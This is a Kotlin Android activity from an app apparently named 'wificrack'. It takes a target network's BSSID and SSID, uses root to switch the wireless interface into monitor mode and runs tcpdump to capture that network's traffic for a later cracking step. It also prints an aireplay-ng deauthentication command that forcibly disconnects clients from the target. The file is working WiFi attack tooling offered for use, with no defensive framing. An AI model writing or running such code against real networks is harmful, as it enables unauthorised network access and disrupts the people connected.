package com.bench.wificrack

import android.content.Intent
import android.os.Bundle
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import java.io.BufferedReader
import java.io.InputStreamReader

class CaptureActivity : AppCompatActivity() {

    private var captureProcess: Process? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_capture)

        val bssid = intent.getStringExtra("BSSID") ?: ""
        val ssid  = intent.getStringExtra("SSID")  ?: ""
        val caps  = intent.getStringExtra("CAPS")  ?: ""

        val tvInfo   = findViewById<TextView>(R.id.tvCaptureInfo)
        val tvLog    = findViewById<TextView>(R.id.tvCaptureLog)
        val btnStart = findViewById<Button>(R.id.btnStartCapture)
        val btnCrack = findViewById<Button>(R.id.btnGoToCrack)

        tvInfo.text = "Target: $ssid\nBSSID: $bssid\nSecurity: $caps"

        btnStart.setOnClickListener {
            // FILL: replace wlan0 with your interface — check via `adb shell ip link`
            val iface    = "wlan0"
            val pcapPath = "/sdcard/capture_${bssid.replace(":", "")}.pcap"

            val cmd = """
                su -c "
                ip link set $iface down &&
                iw dev $iface set type monitor &&
                ip link set $iface up &&
                tcpdump -i $iface -w $pcapPath 'ether host $bssid' &
                echo CAPTURE_PID=\$!
                "
            """.trimIndent()

            Thread {
                try {
                    captureProcess = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
                    val reader = BufferedReader(
                        InputStreamReader(captureProcess!!.inputStream)
                    )
                    var line: String?
                    while (reader.readLine().also { line = it } != null) {
                        val l = line!!
                        runOnUiThread { tvLog.append("$l\n") }
                    }
                } catch (e: Exception) {
                    runOnUiThread { tvLog.append("ERR: ${e.message}\n") }
                }
            }.start()

            tvLog.append("Capture started → $pcapPath\n")
            tvLog.append("Deauth shortcut: adb shell su -c \"aireplay-ng -0 5 -a $bssid $iface\"\n")
        }

        btnCrack.setOnClickListener {
            startActivity(Intent(this, CrackActivity::class.java))
        }
    }

    override fun onDestroy() {
        captureProcess?.destroy()
        super.onDestroy()
    }
}
